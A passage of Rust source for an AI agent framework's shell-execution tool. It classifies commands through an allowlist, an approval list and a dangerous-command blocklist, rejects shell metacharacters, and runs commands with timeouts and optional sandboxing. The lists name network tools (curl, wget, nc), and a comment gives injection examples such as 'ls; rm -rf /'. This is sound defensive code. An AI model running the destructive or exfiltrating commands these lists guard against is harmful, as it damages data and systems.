//! Shell command execution tool
//!
//! Security policy: only allows safe commands in the whitelist, uses direct argv execution (rejects shell injection)

use echo_core::error::{Result, ToolError};
use echo_core::sandbox::{
    SandboxCommand, SandboxExecutor, SandboxOutputChannel, SandboxStreamEvent,
};
use echo_core::tools::artifact::{
    ToolOutputArtifactIdentity, ToolOutputArtifactRef, ToolOutputArtifactWriter,
};
use echo_core::tools::cell::{
    CommandCellError, CommandCellOwner, CommandCellRegistry, CommandCellRequest,
};
use echo_core::tools::permission::ToolPermission;
use echo_core::tools::{
    CommandPolicy, CommandPolicyDecision, Tool, ToolContext, ToolFailure, ToolFailureCategory,
    ToolOutputChannel, ToolParameters, ToolResult, ToolResultKind, ToolRiskLevel, ToolSideEffect,
    ToolStreamEvent,
};
use echo_core::utils::utf8::{IncrementalUtf8Decoder, split_utf8_chunks};
use futures::future::BoxFuture;
use futures::{Stream, StreamExt};
use serde_json::Value;
use shlex::split as shlex_split;
use std::collections::HashSet;
use std::pin::Pin;
use std::process::Stdio;
use std::sync::{Arc, LazyLock, Mutex};
use std::time::{Duration, Instant};
use tokio::io::AsyncReadExt;
use tokio::process::Command;
use tokio::sync::mpsc;

const STREAM_CHUNK_BYTES: usize = 16 * 1024;
const MAX_RETAINED_OUTPUT_BYTES: usize = 1024 * 1024;
const STREAM_CHANNEL_CAPACITY: usize = 32;

static ALLOWED_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // ===== File viewing =====
        "ls", "cat", "head", "tail", "less", "more", "file", "stat", "wc",
        // ===== Directory operations (read-only) =====
        "pwd", "tree", "find", "du", // ===== Code related =====
        "git", "cargo", "rustc", "clippy", "rustfmt", // ===== Search & find =====
        "grep", "rg", "ag", "fd", // ===== Text processing (read-only) =====
        "echo", "printf", "cut", "sort", "uniq", "diff",
        // ===== System info (read-only) =====
        "which", "whereis", "env", "date", "uname",
    ])
});

static REQUIRE_APPROVAL_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // ===== File deletion/modification (requires confirmation) =====
        "rm", "rmdir", "mv", "cp", // ===== Network operations (requires confirmation) =====
        "curl", "wget", "nc", // ===== Process operations (requires confirmation) =====
        "kill", "killall", "pkill", // ===== Package management (requires confirmation) =====
        "apt", "apt-get", "yum", "dnf", "brew", "pip", "pip3", "npm", "yarn", "pnpm",
        // ===== Script execution (requires confirmation) =====
        "bash", "sh", "zsh", "fish", "python", "python3", "node", "perl", "ruby", "php",
        // ===== Text processing (may modify files) =====
        "sed", "awk",
    ])
});

static DANGEROUS_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // ===== Extremely dangerous (data destruction) =====
        "dd", "shred", "mkfs", "fdisk", // ===== Privilege escalation =====
        "sudo", "su", // ===== Permission modification =====
        "chmod", "chown", "chgrp", // ===== System operations =====
        "reboot", "shutdown", "halt", "poweroff", "init",
        // ===== High-risk network operations =====
        "nmap",
    ])
});

static GIT_SAFE_SUBCOMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // Read-only operations
        "status", "log", "show", "diff", "branch", "tag", "ls-files", "ls-tree", "remote", "config",
        // Modifying operations requiring user confirmation
        "add", "commit", "checkout", "switch", "stash",
    ])
});

static CARGO_SAFE_SUBCOMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // Read-only / build operations
        "check", "build", "test", "clippy", "fmt", "tree", "search", "metadata",
        // Requires confirmation
        "clean", "update",
    ])
});

/// Shell metacharacter list (used to reject shell syntax and prevent injection)
///
/// These characters have special meaning in `sh -c`. This tool uses direct argv execution,
/// so commands containing these characters will be rejected UNLESS a sandbox is configured.
const SHELL_METACHARACTERS: &[char] = &[
    '|',  // pipe
    ';',  // command separator
    '&',  // background/conditional execution
    '$',  // variable/command substitution
    '`',  // backtick command substitution
    '>',  // redirect output
    '<',  // redirect input
    '(',  // subshell
    ')',  // subshell
    '\n', // newline injection
];

/// Commands that are safe to run inside a sandbox (sandbox provides isolation)
static SANDBOX_SAFE_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        "bash", "sh", "zsh", "fish", "python", "python3", "node", "perl", "ruby", "php", "pip",
        "pip3", "npm", "yarn", "pnpm", "sed", "awk",
    ])
});

/// Command safety check result
pub type CommandSafety = CommandPolicyDecision;

/// Default command policy used by [`ShellTool`].
#[derive(Debug, Clone, Copy)]
pub struct StandardCommandPolicy {
    strict: bool,
    sandboxed: bool,
}

impl StandardCommandPolicy {
    pub fn strict() -> Self {
        Self {
            strict: true,
            sandboxed: false,
        }
    }

    pub fn permissive() -> Self {
        Self {
            strict: false,
            sandboxed: false,
        }
    }

    pub fn with_sandbox(mut self, sandboxed: bool) -> Self {
        self.sandboxed = sandboxed;
        self
    }
}

impl CommandPolicy for StandardCommandPolicy {
    fn evaluate(&self, command: &str) -> CommandPolicyDecision {
        ShellTool::for_policy_evaluation(self.strict, self.sandboxed).check_command_safety(command)
    }
}

/// Validate a shell command against the strict default safety policy.
///
/// This is the canonical, reusable safety gate used by every shell-execution
/// path in the framework (the synchronous `ShellTool` plus async/background
/// spawners such as `spawn_background_task`). It uses the default strict
/// `ShellTool` (no sandbox, strict whitelist), so it rejects shell
/// metacharacters, dangerous commands, and non-whitelisted programs.
///
/// Callers that execute commands obtained from the LLM (or any untrusted
/// source) **must** call this before spawning a process and honor the
/// returned [`CommandSafety`] verdict.
pub fn validate_command_safety(command: &str) -> CommandSafety {
    StandardCommandPolicy::strict().evaluate(command)
}

/// Shell command execution tool (with safety checks)
///
/// Optional sandbox executor integration: when `sandbox` is set, all commands execute through the sandbox,
/// providing additional isolation and resource limits.
///
/// Optional background mode: when a [`CommandCellRegistry`] is configured via
/// [`ShellTool::with_cell_launcher`], `background=true` launches the command
/// as a cell and returns a `cell_id` immediately.
pub struct ShellTool {
    /// Whether strict mode is enabled (default true)
    strict_mode: bool,
    command_policy: Option<Arc<dyn CommandPolicy>>,
    policy_sandboxed: bool,
    /// Optional sandbox executor (interior-mutable so `Tool::set_sandbox`
    /// can inject it post-construction via `ToolManager::apply_sandbox`).
    sandbox: Mutex<Option<Arc<dyn SandboxExecutor>>>,
    /// Optional command cell registry for `background=true` launches.
    /// `None` (default) = background mode unavailable.
    cell_launcher: Option<Arc<dyn CommandCellRegistry>>,
    /// Command timeout in seconds (default 60 seconds)
    timeout_secs: u64,
}

impl Default for ShellTool {
    fn default() -> Self {
        Self::new()
    }
}

impl ShellTool {
    /// Create a new Shell tool (default strict mode, 60s timeout)
    pub fn new() -> Self {
        Self {
            strict_mode: true,
            command_policy: None,
            policy_sandboxed: false,
            sandbox: Mutex::new(None),
            cell_launcher: None,
            timeout_secs: 60,
        }
    }

    /// Create a non-strict mode Shell tool (not recommended!)
    pub fn new_permissive() -> Self {
        Self {
            strict_mode: false,
            command_policy: None,
            policy_sandboxed: false,
            sandbox: Mutex::new(None),
            cell_launcher: None,
            timeout_secs: 60,
        }
    }

    fn for_policy_evaluation(strict_mode: bool, policy_sandboxed: bool) -> Self {
        Self {
            strict_mode,
            command_policy: None,
            policy_sandboxed,
            sandbox: Mutex::new(None),
            cell_launcher: None,
            timeout_secs: 60,
        }
    }

    /// Replace the default classifier with an application-supplied policy.
    pub fn with_command_policy(mut self, policy: Arc<dyn CommandPolicy>) -> Self {
        self.command_policy = Some(policy);
        self
    }

    /// Set the sandbox executor; commands will be executed through the sandbox
    pub fn with_sandbox(self, sandbox: Arc<dyn SandboxExecutor>) -> Self {
        *self
            .sandbox
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner()) = Some(sandbox);
        self
    }

    /// Set the command cell registry used by `background=true` launches.
    /// (Plain field assignment — the registry is injected once at setup time,
    /// unlike the interior-mutable `sandbox` Mutex which `Tool::set_sandbox`
    /// fills in later.)
    pub fn with_cell_launcher(mut self, cells: Arc<dyn CommandCellRegistry>) -> Self {
        self.cell_launcher = Some(cells);
        self
    }

    /// Set command timeout in seconds (default 60 seconds)
    pub fn with_timeout(mut self, timeout_secs: u64) -> Self {
        self.timeout_secs = timeout_secs;
        self
    }

    /// Check if the command contains shell metacharacters
    ///
    /// Note: metacharacters inside quotes are safe (passed as literal arguments),
    /// but this tool takes a conservative approach and rejects any metacharacter found.
    /// This prevents injection attacks like `ls; rm -rf /` or `echo $(id)`.
    fn has_shell_metacharacters(&self, cmd: &str) -> bool {
        cmd.contains(SHELL_METACHARACTERS)
    }

    /// Launch the command as a background cell (Codex-style `background=true`).
    ///
    /// Order of gates (mirrors the foreground policy):
    /// 1. no cell registry → refuse;
    /// 2. the SAME `check_command_safety` classifier as the foreground path
    ///    (Safe proceeds; RequiresApproval/Dangerous return the same errors);
    /// 3. launch through the registry and return the `cell_id` immediately.
    ///
    /// `require_sandbox` is carried in the request. A registry without the
    /// matching executor must reject rather than silently downgrade.
    async fn launch_background_cell(
        &self,
        command: &str,
        ctx: &ToolContext,
        timeout_secs: Option<u64>,
        has_sandbox: bool,
    ) -> ToolResult {
        let Some(launcher) = self.cell_launcher.clone() else {
            return ToolResult::error("background mode requires a command cell registry");
        };
        // 与前台完全相同的安全校验路径。
        match self.check_command_safety(command) {
            CommandSafety::Safe => {}
            CommandSafety::RequiresApproval(reason) => {
                return ToolResult::failure(
                    ToolFailureCategory::Permanent,
                    format!(
                        "⚠️  Manual confirmation required: {}\nCommand: {}\n\nPlease use the human_loop module to confirm before executing.",
                        reason, command
                    ),
                );
            }
            CommandSafety::Dangerous(reason) => {
                return ToolResult::failure(
                    ToolFailureCategory::Permanent,
                    format!(
                        "🚫 Safety rejection: {}\nCommand: {}\n\nTo perform this operation, please execute it manually in the terminal.",
                        reason, command
                    ),
                );
            }
        }

        let request = CommandCellRequest {
            command: command.to_string(),
            working_dir: ctx
                .working_dir
                .as_ref()
                .map(|dir| dir.display().to_string()),
            timeout_secs,
            require_sandbox: has_sandbox,
            // Background cells outlive the foreground Turn. Product runtimes
            // that distinguish pause from cancel stop owned cells explicitly
            // by run identity instead of inheriting the Turn token here.
            cancel: None,
            owner: CommandCellOwner {
                conversation_id: ctx.conversation_id.clone(),
                run_id: ctx.run_id.clone(),
                turn_id: ctx.turn_id.clone(),
                message_id: ctx.message_id.clone(),
                execution_id: ctx.execution_id.clone(),
                call_id: ctx.call_id.clone(),
            },
            output_artifacts: ctx.output_artifacts.clone(),
            artifact_identity: ctx
                .output_artifacts
                .as_ref()
                .map(|_| ToolOutputArtifactIdentity::from_context(ctx, self.name())),
        };
        match launcher.launch(request).await {
            Ok(receipt) => {
                let payload = serde_json::json!({
                    "cell_id": receipt.cell_id,
                    "status": "queued",
                    "accepted_at": receipt.accepted_at,
                    "deadline": receipt.deadline,
                    "hint": "call wait(cell_id, cursor=0, yield_time_ms=30000) to await output; re-pass the returned next_cursor"
                });
                ToolResult::success_json(payload)
            }
            Err(error) => {
                let category = match error {
                    CommandCellError::Validation { .. }
                    | CommandCellError::DuplicateIdentity { .. } => {
                        ToolFailureCategory::InvalidArguments
                    }
                    CommandCellError::CapacityDeadline => ToolFailureCategory::Timeout,
                    CommandCellError::Cancelled => ToolFailureCategory::Cancelled,
                    CommandCellError::Shutdown | CommandCellError::NotFound { .. } => {
                        ToolFailureCategory::Unavailable
                    }
                    CommandCellError::Runtime { .. } => ToolFailureCategory::Transient,
                };
                ToolResult::failure(
                    category,
                    format!("Failed to launch background cell: {error}"),
                )
            }
        }
    }

    /// Check whether a command is safe
    pub fn check_command_safety(&self, command: &str) -> CommandSafety {
        if let Some(policy) = &self.command_policy {
            return policy.evaluate(command);
        }
        let has_sandbox = self
            .sandbox
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner())
            .is_some()
            || self.policy_sandboxed;

        // Check for shell metacharacters (prevent injection)
        // When sandbox is available, allow metacharacters — sandbox provides isolation
        if self.has_shell_metacharacters(command) && !has_sandbox {
            return CommandSafety::Dangerous(format!(
                "Command contains shell metacharacters (| ; & $ ` > < () etc.), execution rejected.\
                 \nThis tool only supports simple commands (program + args), not pipes, redirects, command substitution, or other shell syntax.\
                 \nTip: enable a sandbox to allow shell syntax.\
                 \nCommand: {}",
                command
            ));
        }

        let parts = match shlex_split(command) {
            Some(parts) => parts,
            None => {
                // If sandbox is available, allow unparseable commands (will use sh -c)
                if has_sandbox {
                    return CommandSafety::Safe;
                }
                return CommandSafety::Dangerous(format!(
                    "Command parsing failed, possibly unclosed quotes or malformed arguments: {}",
                    command
                ));
            }
        };
        if parts.is_empty() {
            return CommandSafety::Dangerous("Empty command".to_string());
        }

        let base_cmd = parts[0].as_str();

        // 1. Check if in the dangerous command blocklist (always enforced, even with sandbox)
        if DANGEROUS_COMMANDS.contains(base_cmd) {
            return CommandSafety::Dangerous(format!(
                "Command '{}' is in the dangerous command blocklist, execution rejected",
                base_cmd
            ));
        }

        // 2. Sandbox mode: commands in SANDBOX_SAFE_COMMANDS are allowed without approval
        if has_sandbox && SANDBOX_SAFE_COMMANDS.contains(base_cmd) {
            return CommandSafety::Safe;
        }

        // 3. Check if manual confirmation is required
        if REQUIRE_APPROVAL_COMMANDS.contains(base_cmd) {
            return CommandSafety::RequiresApproval(format!(
                "Command '{}' may cause system changes, requires manual confirmation",
                base_cmd
            ));
        }

        // 4. Strict mode: must be in the whitelist
        if self.strict_mode && !ALLOWED_COMMANDS.contains(base_cmd) {
            return CommandSafety::Dangerous(format!(
                "Command '{}' is not in the safe whitelist, execution rejected",
                base_cmd
            ));
        }

        // 5. Subcommand check for special commands
        match base_cmd {
            "git" => self.check_git_command(&parts),
            "cargo" => self.check_cargo_command(&parts),
            _ => CommandSafety::Safe,
        }
    }

    /// Check git subcommand
    fn check_git_command(&self, parts: &[String]) -> CommandSafety {
        if parts.len() < 2 {
            return CommandSafety::Safe;
        }

        let subcommand = parts[1].as_str();

        // Check git operation
        match subcommand {
            // Network operations (require confirmation)
            "push" | "pull" | "fetch" | "clone" => CommandSafety::RequiresApproval(format!(
                "git {} involves network operations, requires confirmation",
                subcommand
            )),
            // Force reset (dangerous, reject)
            "reset" => {
                if parts.iter().any(|part| part == "--hard") {
                    CommandSafety::Dangerous(
                        "git reset --hard will lose data, rejected. Please execute manually if needed".to_string(),
                    )
                } else {
                    CommandSafety::RequiresApproval(
                        "git reset will modify Git state, requires confirmation".to_string(),
                    )
                }
            }
            // Clean untracked files (requires confirmation)
            "clean" => CommandSafety::RequiresApproval(
                "git clean will delete untracked files, requires confirmation".to_string(),
            ),
            // Safe subcommands
            cmd if GIT_SAFE_SUBCOMMANDS.contains(cmd) => {
                if cmd == "commit" || cmd == "add" || cmd == "checkout" {
                    CommandSafety::RequiresApproval(format!(
                        "git {} will modify the repository, requires confirmation",
                        cmd
                    ))
                } else {
                    CommandSafety::Safe
                }
            }
            // Unknown subcommand (requires confirmation)
            _ => CommandSafety::RequiresApproval(format!(
                "git {} is not in the known safe list, requires confirmation",
                subcommand
            )),
        }
    }

    /// Check cargo subcommand
    fn check_cargo_command(&self, parts: &[String]) -> CommandSafety {
        if parts.len() < 2 {
            return CommandSafety::Safe;
        }

        let subcommand = parts[1].as_str();

        match subcommand {
            // Package install/publish (requires confirmation)
            "install" | "uninstall" | "publish" => CommandSafety::RequiresApproval(format!(
                "cargo {} involves package installation/publishing, requires confirmation",
                subcommand
            )),
            // Run programs (requires confirmation)
            "run" => CommandSafety::RequiresApproval(
                "cargo run will execute a program, requires confirmation".to_string(),
            ),
            // Known safe commands
            cmd if CARGO_SAFE_SUBCOMMANDS.contains(cmd) => {
                if cmd == "clean" || cmd == "update" {
                    CommandSafety::RequiresApproval(format!(
                        "cargo {} will modify the project, requires confirmation",
                        cmd
                    ))
                } else {
                    CommandSafety::Safe
                }
            }
            // Unknown subcommand (requires confirmation)
            _ => CommandSafety::RequiresApproval(format!(
                "cargo {} is not in the known safe list, requires confirmation",
                subcommand
            )),
        }
    }
}

impl Tool for ShellTool {
    fn name(&self) -> &str {
        "shell"
    }

    fn description(&self) -> &str {
        "Execute restricted shell commands (only safe read-only operations and code-related commands are allowed). Parameter: command - the command to execute. Note: only simple commands (program + args) are supported; pipes, redirects, command substitution, and other shell syntax are not allowed."
    }

    fn permissions(&self) -> Vec<ToolPermission> {
        vec![ToolPermission::Execute]
    }

    fn risk_level(&self) -> ToolRiskLevel {
        ToolRiskLevel::Dangerous
    }

    /// P2: receive sandbox at agent-setup time (via ToolManager::apply_sandbox).
    fn set_sandbox(&self, sandbox: Arc<dyn SandboxExecutor>) -> bool {
        *self
            .sandbox
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner()) = Some(sandbox);
        true
    }

    fn parameters(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The command to execute (only safe commands in the whitelist; shell syntax like pipes/redirects/command substitution is not supported)"
                },
                "timeout": {
                    "type": "integer",
                    "description": "Command timeout in seconds (foreground default: 60, max: 300; background uses the cell runtime limit)"
                },
                "background": {
                    "type": "boolean",
                    "description": "Run in background and return a cell_id immediately. Use wait(cell_id, yield_time_ms) to long-poll for output/exit status."
                }
            },
            "required": ["command"]
        })
    }

    fn execute_with_context<'a>(
        &'a self,
        parameters: ToolParameters,
        ctx: &'a ToolContext,
    ) -> BoxFuture<'a, Result<ToolResult>> {
        Box::pin(async move {
            let mut stream = self.execute_stream_with_context(parameters, ctx).await?;
            while let Some(event) = stream.next().await {
                if let ToolStreamEvent::Complete(result) = event {
                    return Ok(result);
                }
            }
            Ok(ToolResult::failure(
                ToolFailureCategory::Permanent,
                "Shell execution stream ended without a completion event",
            ))
        })
    }

    fn execute_stream_with_context<'a>(
        &'a self,
        parameters: ToolParameters,
        ctx: &ToolContext,
    ) -> BoxFuture<'a, Result<Pin<Box<dyn Stream<Item = ToolStreamEvent> + Send + 'a>>>> {
        let ctx = ctx.clone();
        Box::pin(async move {
            let sandbox = self
                .sandbox
                .lock()
                .unwrap_or_else(|poisoned| poisoned.into_inner())
                .clone();
            let command = parameters
                .get("command")
                .and_then(|v| v.as_str())
                .ok_or_else(|| ToolError::MissingParameter("command".to_string()))?;

            // Extract timeout parameter (default 60s). The background path maps
            // an explicit timeout onto the cell lifetime WITHOUT the 300s
            // foreground cap (hour-scale builds are the whole point of cells).
            let has_timeout_param = parameters.contains_key("timeout");
            let timeout_secs_raw = parameters
                .get("timeout")
                .and_then(|v| v.as_u64())
                .unwrap_or(self.timeout_secs);

            // ── Background mode: launch a cell, return immediately ──
            let background = parameters
                .get("background")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            if background {
                let result = self
                    .launch_background_cell(
                        command,
                        &ctx,
                        if has_timeout_param {
                            Some(timeout_secs_raw)
                        } else {
                            None
                        },
                        sandbox.is_some(),
                    )
                    .await;
                return Ok(single_complete_stream(result));
            }

            // ── Foreground path (unchanged) ─────────────────────────
            // Cap at 300 seconds
            let timeout_secs = timeout_secs_raw.min(300);

            match self.check_command_safety(command) {
                CommandSafety::Safe => {}
                CommandSafety::RequiresApproval(reason) => {
                    return Ok(single_complete_stream(ToolResult::failure(
                        ToolFailureCategory::Permanent,
                        format!(
                            "⚠️  Manual confirmation required: {}\nCommand: {}\n\nPlease use the human_loop module to confirm before executing.",
                            reason, command
                        ),
                    )));
                }
                CommandSafety::Dangerous(reason) => {
                    return Ok(single_complete_stream(ToolResult::failure(
                        ToolFailureCategory::Permanent,
                        format!(
                            "🚫 Safety rejection: {}\nCommand: {}\n\nTo perform this operation, please execute it manually in the terminal.",
                            reason, command
                        ),
                    )));
                }
            }

            let has_metacharacters = self.has_shell_metacharacters(command);
            let working_dir = ctx
                .working_dir
                .clone()
                .or_else(|| std::env::current_dir().ok());
            let timeout = Duration::from_secs(timeout_secs);
            let artifact_capture = ArtifactCapture::new(&ctx, self.name());

            if let Some(sandbox) = sandbox {
                let mut sandbox_cmd = if has_metacharacters {
                    SandboxCommand::program("sh", vec!["-c".to_string(), command.to_string()])
                } else {
                    let parts = parse_command(self.name(), command)?;
                    let Some(program) = parts.first() else {
                        return Err(ToolError::ExecutionFailed {
                            tool: self.name().to_string(),
                            message: "Command is empty".to_string(),
                        }
                        .into());
                    };
                    SandboxCommand::program(program, parts.get(1..).unwrap_or_default().to_vec())
                };
                sandbox_cmd.timeout = timeout;
                if let Some(dir) = &working_dir {
                    sandbox_cmd = sandbox_cmd.with_working_dir(dir);
                }
                Ok(start_sandbox_stream(
                    sandbox,
                    sandbox_cmd,
                    working_dir,
                    artifact_capture,
                ))
            } else {
                let parts = parse_command(self.name(), command)?;
                let Some(program) = parts.first() else {
                    return Err(ToolError::ExecutionFailed {
                        tool: self.name().to_string(),
                        message: "Command is empty".to_string(),
                    }
                    .into());
                };
                start_direct_stream(
                    program,
                    parts.get(1..).unwrap_or_default(),
                    working_dir,
                    timeout,
                    artifact_capture,
                )
            }
        })
    }

    fn supports_streaming(&self) -> bool {
        true
    }
}

fn parse_command(tool_name: &str, command: &str) -> Result<Vec<String>> {
    shlex_split(command).ok_or_else(|| {
        ToolError::ExecutionFailed {
            tool: tool_name.to_string(),
            message:
                "Command parsing failed, possibly unclosed quotes or malformed argument format"
                    .to_string(),
        }
        .into()
    })
}

fn single_complete_stream<'a>(
    result: ToolResult,
) -> Pin<Box<dyn Stream<Item = ToolStreamEvent> + Send + 'a>> {
    Box::pin(futures::stream::once(async move {
        ToolStreamEvent::Complete(result)
    }))
}

fn receiver_stream<'a>(
    receiver: mpsc::Receiver<ToolStreamEvent>,
) -> Pin<Box<dyn Stream<Item = ToolStreamEvent> + Send + 'a>> {
    Box::pin(futures::stream::unfold(
        receiver,
        |mut receiver| async move { receiver.recv().await.map(|event| (event, receiver)) },
    ))
}

fn start_direct_stream<'a>(
    program: &str,
    args: &[String],
    working_dir: Option<std::path::PathBuf>,
    timeout: Duration,
    artifact_capture: ArtifactCapture,
) -> Result<Pin<Box<dyn Stream<Item = ToolStreamEvent> + Send + 'a>>> {
    let mut command = Command::new(program);
    command
        .args(args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    #[cfg(unix)]
    command.process_group(0);
    if let Some(dir) = &working_dir {
        command.current_dir(dir);
    }

    let mut child = command
        .spawn()
        .map_err(|error| ToolError::ExecutionFailed {
            tool: "shell".to_string(),
            message: format!("Unable to execute command: {error}"),
        })?;
    let stdout = child.stdout.take();
    let stderr = child.stderr.take();
    let (tx, rx) = mpsc::channel(STREAM_CHANNEL_CAPACITY);
    tokio::spawn(async move {
        run_direct_child(
            &mut child,
            stdout,
            stderr,
            tx,
            working_dir,
            timeout,
            artifact_capture,
        )
        .await;
    });
    Ok(receiver_stream(rx))
}

fn start_sandbox_stream<'a>(
    sandbox: Arc<dyn SandboxExecutor>,
    command: SandboxCommand,
    working_dir: Option<std::path::PathBuf>,
    mut artifact_capture: ArtifactCapture,
) -> Pin<Box<dyn Stream<Item = ToolStreamEvent> + Send + 'a>> {
    let (tx, rx) = mpsc::channel(STREAM_CHANNEL_CAPACITY);
    tokio::spawn(async move {
        let stream = tokio::select! {
            _ = tx.closed() => return,
            stream = sandbox.execute_stream(command) => stream,
        };
        let Ok(mut stream) = stream else {
            let message = stream
                .err()
                .map(|error| format!("Sandbox execution failed: {error}"))
                .unwrap_or_else(|| "Sandbox execution failed".to_string());
            let result = ToolResult::failure(ToolFailureCategory::Unavailable, message)
                .with_meta("duration_ms", "0")
                .with_meta("exit_code", "-1")
                .with_meta(
                    "working_dir",
                    working_dir
                        .as_ref()
                        .map(|dir| dir.display().to_string())
                        .unwrap_or_default(),
                )
                .with_meta("output_truncated", "false")
                .with_meta("stdout_bytes", "0")
                .with_meta("stderr_bytes", "0");
            let _ = tx.send(ToolStreamEvent::Complete(result)).await;
            return;
        };

        loop {
            let event = tokio::select! {
                _ = tx.closed() => return,
                event = stream.next() => event,
            };
            let Some(event) = event else {
                return;
            };
            let mapped = match event {
                SandboxStreamEvent::Output { channel, chunk } => {
                    let tool_channel = match channel {
                        SandboxOutputChannel::Stdout => ToolOutputChannel::Stdout,
                        SandboxOutputChannel::Stderr => ToolOutputChannel::Stderr,
                    };
                    artifact_capture.push(tool_channel, &chunk);
                    ToolStreamEvent::Output {
                        channel: tool_channel,
                        chunk,
                    }
                }
                SandboxStreamEvent::Complete(result) => {
                    let result = tool_result_from_execution(result, working_dir.as_ref());
                    ToolStreamEvent::Complete(artifact_capture.finish(result))
                }
                SandboxStreamEvent::Failed { failure } => {
                    let category = if failure.is_cancelled() {
                        ToolFailureCategory::Cancelled
                    } else {
                        ToolFailureCategory::Permanent
                    };
                    let result = ToolResult::failure(category, failure.message())
                        .with_meta("duration_ms", "0")
                        .with_meta("exit_code", "-1")
                        .with_meta(
                            "working_dir",
                            working_dir
                                .as_ref()
                                .map(|dir| dir.display().to_string())
                                .unwrap_or_default(),
                        )
                        .with_meta("output_truncated", "false")
                        .with_meta("stdout_bytes", "0")
                        .with_meta("stderr_bytes", "0");
                    ToolStreamEvent::Complete(artifact_capture.finish(result))
                }
            };
            if tx.send(mapped).await.is_err() {
                return;
            }
        }
    });
    receiver_stream(rx)
}

async fn run_direct_child(
    child: &mut tokio::process::Child,
    mut stdout: Option<tokio::process::ChildStdout>,
    mut stderr: Option<tokio::process::ChildStderr>,
    tx: mpsc::Sender<ToolStreamEvent>,
    working_dir: Option<std::path::PathBuf>,
    timeout: Duration,
    mut artifact_capture: ArtifactCapture,
) {
    let start = Instant::now();
    let deadline = tokio::time::sleep(timeout);
    tokio::pin!(deadline);
    let mut stdout_buffer = [0_u8; STREAM_CHUNK_BYTES];
    let mut stderr_buffer = [0_u8; STREAM_CHUNK_BYTES];
    let mut stdout_decoder = IncrementalUtf8Decoder::default();
    let mut stderr_decoder = IncrementalUtf8Decoder::default();
    let mut retained_stdout = RetainedOutput::default();
    let mut retained_stderr = RetainedOutput::default();
    let mut status = None;

    loop {
        if stdout.is_none() && stderr.is_none() && status.is_some() {
            break;
        }

        tokio::select! {
            _ = tx.closed() => {
                cleanup_direct_child(child).await;
                return;
            }
            _ = &mut deadline => {
                cleanup_direct_child(child).await;
                let result = artifact_capture.finish(build_tool_result(
                    -1,
                    retained_stdout,
                    retained_stderr,
                    start.elapsed(),
                    working_dir.as_ref(),
                    true,
                ));
                let _ = tx.send(ToolStreamEvent::Complete(result)).await;
                return;
            }
            read = async {
                match stdout.as_mut() {
                    Some(pipe) => pipe.read(&mut stdout_buffer).await,
                    None => Ok(0),
                }
            }, if stdout.is_some() => {
                match read {
                    Ok(0) => {
                        stdout = None;
                        if let Some(chunk) = stdout_decoder.finish() {
                            artifact_capture.push(ToolOutputChannel::Stdout, &chunk);
                            if send_output(&tx, ToolOutputChannel::Stdout, chunk).await.is_err() {
                                cleanup_direct_child(child).await;
                                return;
                            }
                        }
                    }
                    Ok(count) => {
                        let bytes = stdout_buffer.get(..count).unwrap_or_default();
                        let retained = retained_stdout
                            .bytes
                            .len()
                            .saturating_add(retained_stderr.bytes.len());
                        retained_stdout.push(bytes, MAX_RETAINED_OUTPUT_BYTES.saturating_sub(retained));
                        for chunk in stdout_decoder.push(bytes) {
                            artifact_capture.push(ToolOutputChannel::Stdout, &chunk);
                            if send_output(&tx, ToolOutputChannel::Stdout, chunk).await.is_err() {
                                cleanup_direct_child(child).await;
                                return;
                            }
                        }
                    }
                    Err(_) => stdout = None,
                }
            }
            read = async {
                match stderr.as_mut() {
                    Some(pipe) => pipe.read(&mut stderr_buffer).await,
                    None => Ok(0),
                }
            }, if stderr.is_some() => {
                match read {
                    Ok(0) => {
                        stderr = None;
                        if let Some(chunk) = stderr_decoder.finish() {
                            artifact_capture.push(ToolOutputChannel::Stderr, &chunk);
                            if send_output(&tx, ToolOutputChannel::Stderr, chunk).await.is_err() {
                                cleanup_direct_child(child).await;
                                return;
                            }
                        }
                    }
                    Ok(count) => {
                        let bytes = stderr_buffer.get(..count).unwrap_or_default();
                        let retained = retained_stdout
                            .bytes
                            .len()
                            .saturating_add(retained_stderr.bytes.len());
                        retained_stderr.push(bytes, MAX_RETAINED_OUTPUT_BYTES.saturating_sub(retained));
                        for chunk in stderr_decoder.push(bytes) {
                            artifact_capture.push(ToolOutputChannel::Stderr, &chunk);
                            if send_output(&tx, ToolOutputChannel::Stderr, chunk).await.is_err() {
                                cleanup_direct_child(child).await;
                                return;
                            }
                        }
                    }
                    Err(_) => stderr = None,
                }
            }
            waited = child.wait(), if status.is_none() => {
                match waited {
                    Ok(exit_status) => status = Some(exit_status),
                    Err(_) => {
                        cleanup_direct_child(child).await;
                        status = None;
                        break;
                    }
                }
            }
        }
    }

    let exit_code = status.and_then(|status| status.code()).unwrap_or(-1);
    let result = artifact_capture.finish(build_tool_result(
        exit_code,
        retained_stdout,
        retained_stderr,
        start.elapsed(),
        working_dir.as_ref(),
        false,
    ));
    let _ = tx.send(ToolStreamEvent::Complete(result)).await;
}

async fn send_output(
    tx: &mpsc::Sender<ToolStreamEvent>,
    channel: ToolOutputChannel,
    text: String,
) -> std::result::Result<(), ()> {
    for chunk in split_utf8_chunks(text, STREAM_CHUNK_BYTES) {
        tx.send(ToolStreamEvent::Output { channel, chunk })
            .await
            .map_err(|_| ())?;
    }
    Ok(())
}

async fn cleanup_direct_child(child: &mut tokio::process::Child) {
    #[cfg(unix)]
    if let Some(pid) = child.id() {
        let _ = std::process::Command::new("kill")
            .args(["-KILL", &format!("-{pid}")])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
    }
    let _ = child.kill().await;
    let _ = child.wait().await;
}

#[derive(Default)]
struct RetainedOutput {
    bytes: Vec<u8>,
    total_bytes: u64,
    truncated: bool,
}

struct ArtifactCapture {
